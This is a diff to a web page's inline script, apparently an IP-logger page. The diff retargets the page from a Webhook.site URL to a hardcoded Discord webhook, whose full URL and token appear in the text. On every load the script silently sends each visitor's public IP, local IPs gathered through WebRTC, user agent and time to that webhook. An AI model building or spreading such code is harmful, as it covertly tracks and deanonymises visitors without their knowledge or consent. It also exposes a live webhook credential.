@@ -15,15 +15,15 @@
 </div>
 
 <script>
-// 1. Put your Webhook.site URL here
-const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1405831826639159347/99mrEbed5c_e7BzwKHiBx6_Dy1wehwjGVpZPdyEw7eEJPwZK5b5nOZH_KIy8zDALWGaS";
+// 1. Put your Discord webhook here
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1405831826639159347/99mrEbed5c_e7BzwKHiBx6_Dy1wehwjGVpZPdyEw7eEJPwZK5b5nOZH_KIy8zDALWGaS";
 
-// Send data to Webhook.site
-function logToWebhook(data) {
-    fetch(WEBHOOK_URL, {
+// Send a message to Discord
+function sendToDiscord(message) {
+    fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify({ content: message })
     }).catch(err => console.error(err));
 }
 
@@ -31,12 +31,8 @@ function logToWebhook(data) {
 fetch("https://api.ipify.org?format=json")
     .then(res => res.json())
     .then(data => {
-        logToWebhook({
-            type: "Public IP",
-            value: data.ip,
-            userAgent: navigator.userAgent,
-            time: new Date().toLocaleString()
-        });
+        const msg = `📌 New Visitor\n🌍 Public IP: ${data.ip}\n🖥 User-Agent: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
+        sendToDiscord(msg);
     });
 
 // Try Local IP via WebRTC
@@ -54,12 +50,8 @@ async function getLocalIPs(callback) {
 }
 
 getLocalIPs(ip => {
-    logToWebhook({
-        type: "Local IP",
-        value: ip,
-        userAgent: navigator.userAgent,
-        time: new Date().toLocaleString()
-    });
+    const msg = `🏠 Local IP: ${ip}\n🖥 User-Agent: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
+    sendToDiscord(msg);
 });
 </script>
 </body>
